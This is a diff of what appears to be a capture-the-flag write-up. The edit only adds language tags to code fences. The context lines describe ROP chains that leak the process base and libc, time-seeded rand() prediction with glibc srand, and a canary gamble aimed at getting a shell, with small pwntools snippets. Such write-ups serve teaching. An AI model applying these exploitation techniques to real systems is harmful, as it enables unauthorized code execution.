@@ -282,7 +282,7 @@ After getting the base process leak we can compute both parts of the ROP chain a
 
 After writing out our ROP chain to leak libc, we'll have to backtrack out by going West.  At this point we know if it is possible to forward/backtrack based on the previous tests, so just move forward, write out ROP chains, then return back to the lower right corner of the maze.
 
-```
+```python
     # kick down walls to the grue
     for i in range(39 - gx):
         p.sendlineafter(b'): ', b'x')
@@ -336,7 +336,7 @@ Once back to the lower right corner we can just head to the Grue, that will trig
 
 With libc location known, we can quickly check if the 2nd pass ROP chain will be able to track forward and back.  Again another 1/4 chance, moving our total chance for success/attempt 1 in 32.
 
-```
+```python
     # pass 2
     glibc = cdll.LoadLibrary('libc.so.6')
     glibc.srand(glibc.time(None))
@@ -425,7 +425,7 @@ The 2nd pass starts out not much different from the 1st pass, it was a cut/paste
 
 At the start of the 2nd pass we know that our new ROP chain will not have any East/West movement problems or NLs.  At this point there's a 1 in 4 chance it will succeed, i.e. the canary block.  If this passes, then we will get a shell, IFF we do not run out of time.  If the Grue and/or the player (us) is in the upper left corner area, then we could run out of time:
 
-```
+```bash
 [*] pass 2
 [*] x,y = 25,6
 [*] rand 25,6
@@ -438,7 +438,7 @@ At the start of the 2nd pass we know that our new ROP chain will not have any Ea
 
 The combined probability of getting this far is 1 in 64.
 
-```
+```python
     p.sendlineafter(b'): ', b'd')
 
     p.sendlineafter(b'): ', b'x')
